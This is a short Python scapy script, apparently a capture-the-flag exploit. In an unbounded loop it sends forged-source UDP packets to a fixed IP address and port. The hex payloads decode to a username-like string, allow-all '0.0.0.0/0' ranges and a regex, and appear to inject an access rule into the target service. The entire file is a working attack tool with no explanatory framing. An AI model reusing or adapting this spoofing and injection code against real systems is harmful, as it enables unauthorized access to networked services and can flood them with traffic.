from scapy.all import *
from binascii import unhexlify

A = '35.212.71.168' # spoofed source IP address
B = '35.212.71.168' # destination IP address
C = 37742 # source port
D = 19696 # destination port

payload1 = "05 00 00 00  0d 00 00 00  00 00 00 00  31 32 38 2e  36 31 2e 32  34 30 2e 37  30 39 30".replace(' ', '')
payload1 = unhexlify(payload1)

payload2 = "01 00 00 00  0c 00 00 00  00 00 00 00  72 30 30 74  69 6d 65 6e  74 61 72 79  00 00 00 00  09 00 00 00  00 00 00 00  30 2e 30 2e  30 2e 30 2f  30 09 00 00  00 00 00 00  00 30 2e 30  2e 30 2e 30  2f 30 00 00  23 00 00 00  00 00 00 00  2e 2a 4f 4f  4f 2e 2a 28  57 68 65 6e  20 63 61 6e  20 77 65 20  67 65 74 20  6f 75 72 20  50 68 2e 44  2e 29 3f".replace(' ', '')
payload2 = unhexlify(payload2)

while True:
    # spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / payload1
    # send(spoofed_packet)

    spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / payload2
    send(spoofed_packet)
